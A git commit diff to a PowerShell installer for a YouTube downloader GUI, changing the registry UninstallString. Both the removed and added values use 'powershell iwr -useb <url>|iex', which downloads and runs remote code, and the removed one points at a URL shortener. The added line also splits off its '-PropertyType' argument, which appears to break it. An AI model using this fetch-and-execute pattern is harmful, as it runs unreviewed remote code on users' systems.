8f4827a5564711151a356415fecc65f601b3282e
yxcyd3871197 <all.time.best.media@gmail.com>
2025-04-07 01:17:40 +0700

    Update yt-dlp-gui-installer.ps1

--- yt-dlp-gui-installer.ps1
+++ yt-dlp-gui-installer.ps1
@@ -48,4 +48,5 @@ New-ItemProperty -Path $key -Name "DisplayIcon" -Value "$Env:LOCALAPPDATA\yt-dlp
 New-ItemProperty -Path $key -Name "DisplayName" -Value "Youtube DLP-GUI Downloader"  -PropertyType "String"
 New-ItemProperty -Path $key -Name "InstallLocation" -Value "$Env:LOCALAPPDATA\yt-dlp-gui"  -PropertyType "String"
 New-ItemProperty -Path $key -Name "Publisher" -Value "https://github.com/kazukikasama/youtube-dlp-gui-installer" -PropertyType "String"
-New-ItemProperty -Path $key -Name "UninstallString" -Value "powershell iwr -useb https://urlr.me/97zG6|iex" -PropertyType "String"
+New-ItemProperty -Path $key -Name "UninstallString" -Value "powershell iwr -useb https://raw.githubusercontent.com/yxcyd3871197/youtube-dlp-gui-installer/main/yt-dlp-gui-uninstaller.ps1|iex"
+ -PropertyType "String"
